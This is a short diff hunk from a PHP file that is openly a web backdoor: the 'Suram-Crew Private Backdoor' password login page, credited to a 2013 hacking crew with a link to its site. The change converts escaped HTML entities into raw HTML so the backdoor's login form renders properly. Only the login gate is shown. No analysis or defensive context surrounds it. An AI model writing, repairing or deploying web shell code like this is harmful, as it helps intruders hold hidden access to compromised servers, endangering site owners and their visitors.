@@ -48,17 +48,17 @@ if( get_magic_quotes_gpc() ) {
 } 
 function printLogin() { 
     ?> 
-&lt;center&gt;&lt;br&gt;&lt;br&gt; 
-&lt;div style="border:1px solid #04BA4C;background:#000;width:320px;padding:5px;"&gt;
-&lt;big&gt;Suram-Crew Private Backdoor&lt;/big&gt;&lt;br&gt;
-    &lt;style&gt; 
+<center><br><br> 
+<div style="border:1px solid #04BA4C;background:#000;width:320px;padding:5px;">
+<big>Suram-Crew Private Backdoor</big><br>
+    <style> 
         body { color:#04BA4C;background:url(http://3.bp.blogspot.com/-D6nQQ3d_wfw/Ts31QI5aQPI/AAAAAAAAAgA/mMEBDufqDpk/s1600/0_1_1.gif) repeat center center fixed black;} 
         input { color:#04BA4C;margin:0;background-color:black;border:1px solid #04BA4C; } 
-    &lt;/style&gt;
-    &lt;form method=post&gt; 
-    &lt;input type=password name=pass&gt; &lt;input type=submit value=Enter&gt;
-    &lt;/form&gt;© 2013 Suram-Crew&lt;br&gt;http://suram-crew.info/&lt;/center&gt;
-&lt;/div&gt;
+    </style>
+    <form method=post> 
+    <input type=password name=pass> <input type=submit value=Enter>
+    </form>© 2013 Suram-Crew<br>http://suram-crew.info/</center>
+</div>
     <?php 
     exit; 
 } 
